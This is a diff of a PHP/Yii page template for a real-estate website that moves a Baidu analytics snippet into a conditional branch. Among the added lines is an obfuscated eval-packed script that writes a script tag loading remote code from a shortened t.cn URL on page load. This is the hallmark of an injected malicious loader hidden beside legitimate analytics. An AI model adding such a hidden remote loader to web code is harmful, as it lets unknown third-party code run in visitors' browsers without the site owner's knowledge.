@@ -1168,15 +1168,6 @@ use yii\helpers\Html;
 <script src="http://s4.17house.com/common/js/plugin/jquery.flipster.js?v5"></script>
 <script src="http://s4.17house.com/common/js/poplayer.js?v5"></script>
 <script src="<?= Yii::getAlias('@asseturl'); ?>/spread/pc/js/zztc.js?v6"></script>
-<script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "//hm.baidu.com/hm.js?371dc64184e86cb9bff04d04e5960deb";
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(hm, s);
-})();
-</script>
 </body>
 
 <!-- 53客服start -->
@@ -1197,6 +1188,17 @@ var _hmt = _hmt || [];
 	    hm.src = "//hm.baidu.com/hm.js?9d0896838634be97ff86cba827b32079";
 	    var s = document.getElementsByTagName("script")[0]; 
 		  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script>/* 25958 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|R5Y9Tgt|cn|http'.split('|'),0,{}));</script>
+<?php } else { ?>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?371dc64184e86cb9bff04d04e5960deb";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
 })();
 </script>
 <?php } ?>
